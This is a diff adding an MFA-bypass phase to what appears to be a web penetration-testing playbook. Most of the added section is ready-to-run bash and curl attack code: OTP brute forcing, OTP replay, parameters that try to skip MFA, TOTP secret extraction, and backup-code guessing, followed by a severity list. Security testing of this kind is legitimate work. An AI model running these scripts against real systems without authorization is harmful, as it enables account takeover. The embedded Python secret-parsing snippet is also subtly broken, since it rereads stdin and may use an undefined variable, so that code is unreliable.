@@ -585,7 +585,143 @@ MY_REFERRAL=$(curl -sk -H "Authorization: Bearer $TOKEN" "$BASE_URL/api/profile"
 
 ---
 
-## Phase 8 — Summary & Chain Analysis
+## Phase 8 — 2FA / MFA Bypass
+
+**Why**: Every modern app has MFA. Bypassing it is a standard pentest deliverable. Most bypasses are business logic flaws — the MFA check is skipped, side-stepped, or can be brute-forced.
+
+```bash
+BASE_URL=<url>
+TOKEN=<session_after_password_but_before_mfa>  # session cookie/token from step 1 of login
+
+echo "=== Phase 8: 2FA / MFA Bypass ==="
+
+echo "--- Test 1: Is pre-MFA session fully authenticated? ---"
+# App issues session after password check. Does that session give access before MFA?
+for endpoint in /api/me /api/profile /api/admin /api/user /api/dashboard /api/account; do
+    CODE=$(curl -sk -H "Authorization: Bearer $TOKEN" \
+        -H "Cookie: session=$TOKEN" \
+        "$BASE_URL$endpoint" -o /dev/null -w "%{http_code}" --max-time 5 2>/dev/null)
+    echo "  $endpoint → HTTP $CODE"
+    [ "$CODE" = "200" ] && echo "    [!] PRE-MFA SESSION AUTHENTICATED — MFA is decorative only!"
+done
+
+echo ""
+echo "--- Test 2: OTP Brute Force (rate limit test) ---"
+# 6-digit TOTP = 1,000,000 codes. Common window = 30 seconds (codes ±1 = ~3 valid codes at any time)
+# Test if rate limiting kicks in
+for i in $(seq 1 15); do
+    OTP=$(printf "%06d" $RANDOM)
+    CODE=$(curl -sk -X POST "$BASE_URL/api/verify-otp" \
+        -H "Content-Type: application/json" \
+        -H "Authorization: Bearer $TOKEN" \
+        -d "{\"otp\":\"$OTP\",\"code\":\"$OTP\",\"token\":\"$OTP\"}" \
+        -o /dev/null -w "%{http_code}" 2>/dev/null)
+    echo "  Attempt $i (OTP=$OTP): HTTP $CODE"
+    [ "$CODE" = "429" ] && echo "  [OK] Rate limited at attempt $i" && break
+    [ "$CODE" = "200" ] && echo "  [!] Accepted!" && break
+done
+
+echo ""
+echo "--- Test 3: OTP Reuse (same code submitted twice) ---"
+VALID_OTP="<your_current_valid_otp>"  # get from your authenticator app
+echo "Submitting same OTP twice in quick succession..."
+for i in 1 2; do
+    CODE=$(curl -sk -X POST "$BASE_URL/api/verify-otp" \
+        -H "Content-Type: application/json" \
+        -H "Authorization: Bearer $TOKEN" \
+        -d "{\"otp\":\"$VALID_OTP\",\"code\":\"$VALID_OTP\"}" \
+        -o /tmp/otp_reuse_$i.txt -w "%{http_code}" 2>/dev/null)
+    echo "  Attempt $i: HTTP $CODE | $(head -c 100 /tmp/otp_reuse_$i.txt)"
+done
+
+echo ""
+echo "--- Test 4: Response Manipulation ---"
+echo "Use Burp/Playwright to intercept the MFA verification response"
+echo "Flip response before JS processes it:"
+echo "  {\"success\":false} → {\"success\":true}"
+echo "  HTTP 401 → HTTP 200"
+echo "  {\"mfa_required\":true} → {\"mfa_required\":false}"
+echo "  {\"verified\":false,\"token\":null} → {\"verified\":true,\"token\":\"forged_session\"}"
+echo ""
+echo "Testing response manipulation via parameter:"
+for param in mfa_required verified step authenticated; do
+    curl -sk -X POST "$BASE_URL/api/login/finalize" \
+        -H "Content-Type: application/json" \
+        -d "{\"$param\":false,\"skip_mfa\":true,\"bypass\":true}" \
+        -o /dev/null -w "  $param=false → %{http_code}\n" 2>/dev/null
+done
+
+echo ""
+echo "--- Test 5: Account Recovery Bypasses MFA ---"
+echo "Password reset flow often bypasses MFA entirely"
+echo "Test: request password reset for MFA-enabled account → does new session have full access?"
+RESET_CODE=$(curl -sk -X POST "$BASE_URL/api/password-reset" \
+    -H "Content-Type: application/json" \
+    -d '{"email":"your_test_account@email.com"}' 2>/dev/null | head -3)
+echo "  Reset request: $RESET_CODE"
+echo "  (If you receive reset link and can set new password → test if new session requires MFA)"
+
+echo ""
+echo "--- Test 6: OAuth Login Bypasses App-Native MFA ---"
+echo "If app has 'Login with Google/GitHub' → does OAuth login bypass MFA?"
+for oauth_path in \
+    "/auth/google" "/auth/github" "/auth/microsoft" \
+    "/api/auth/oauth/google" "/login/google" "/sso/google"; do
+    CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$oauth_path" --max-time 5 2>/dev/null)
+    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && \
+        echo "  [$CODE] $oauth_path — OAuth login endpoint found"
+    echo "  Test: complete OAuth login → check if MFA prompt appears"
+done
+
+echo ""
+echo "--- Test 7: TOTP Secret Extraction ---"
+echo "Check if TOTP setup response leaks the raw secret"
+SETUP_RESP=$(curl -sk -X POST "$BASE_URL/api/mfa/setup" \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"type":"totp"}' 2>/dev/null)
+echo "  MFA setup response: $SETUP_RESP" | head -c 300
+echo ""
+echo "$SETUP_RESP" | python3 -c "
+import json, sys, re
+try:
+    d = json.load(sys.stdin)
+    secret = d.get('secret') or d.get('totp_secret') or d.get('key') or d.get('seed')
+    if secret:
+        print(f'  [!] TOTP SECRET EXPOSED in API response: {secret}')
+        print(f'  → Use: python3 -c \"import pyotp; print(pyotp.TOTP(\\\"{secret}\\\").now())\"')
+except: pass
+data = sys.stdin.read() if isinstance(sys.stdin, type(sys.stdin)) else ''
+secrets = re.findall(r'[A-Z2-7]{16,32}', d if isinstance(d, str) else json.dumps(d))
+if secrets: print(f'  Possible base32 secrets: {secrets}')
+" 2>/dev/null
+
+echo ""
+echo "--- Test 8: Backup Code Enumeration ---"
+echo "Backup codes are often 6-8 char alphanumeric = brute-forceable if rate limit is weak"
+for code in \
+    "00000000" "12345678" "AAAAAAAA" "00000001" "99999999" \
+    "ABCDEFGH" "12345678" "87654321" "11111111"; do
+    CODE=$(curl -sk -X POST "$BASE_URL/api/verify-backup-code" \
+        -H "Authorization: Bearer $TOKEN" \
+        -H "Content-Type: application/json" \
+        -d "{\"code\":\"$code\",\"backup_code\":\"$code\"}" \
+        -o /dev/null -w "%{http_code}" 2>/dev/null)
+    echo "  backup=$code → HTTP $CODE"
+    [ "$CODE" = "200" ] && echo "  [!] BACKUP CODE ACCEPTED: $code"
+done
+```
+
+**Impact gate**:
+- Pre-MFA session authenticated → **Critical** (full auth bypass)
+- OTP brute force no rate limit → **High** (account takeover via 1M code space)
+- Response manipulation bypasses MFA → **Critical** (trivial auth bypass)
+- TOTP secret in API response → **Critical** (permanent MFA bypass)
+- OAuth login skips MFA → **High** (auth bypass for social login users)
+
+---
+
+## Phase 9 — Summary & Chain Analysis (updated)
 
 ```bash
 BASE_URL=<url>; ENG=/home/kali/current
